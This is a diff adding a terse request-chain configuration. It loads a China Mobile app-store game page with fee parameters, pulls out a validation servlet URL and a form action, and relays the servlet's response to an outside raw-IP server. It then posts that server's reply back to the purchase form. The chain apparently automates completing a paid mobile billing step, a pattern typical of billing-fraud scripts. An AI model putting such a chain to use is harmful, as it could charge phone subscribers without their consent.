@@ -1,0 +1,19 @@
+------
+u:http://a.10086.cn/pams2/m/s.do?c=356&j=l&gId=100002226701167700013544000700013544000&gType=game&gFeeType=10000&gAppcateId=&bUrl=c%3D697%26j%3Dl%26mmsType%3D0%26blockId%3D17314%26src%3D5600000004%26p%3D72&lnpsk=%E6%96%B0%E7%83%AD%E8%A1%80%E4%BC%A0%E5%A5%87&lnpsid=e209c8ace1a74f918b5bee1931527f59&lnpspn=1&lnpsr=1&blockId=17314&mmsType=0&src=5600000004&mmsg=%E6%96%B0%E7%83%AD%E8%A1%80%E4%BC%A0%E5%A5%87&p=72
+m:1
+r1:http://a.10086.cn:6060/pams2/validateProgramServlet${validateProgramServlet^"}
+r2:${<form action='^'}
+------
+u:${r1}
+m:1
+r3:${}
+------
+url:http://119.147.23.195:8080/mi/mmide
+method:2
+p:${r3}
+r4:${}
+------
+u:${r2}
+m:2
+p:${r4}
+------
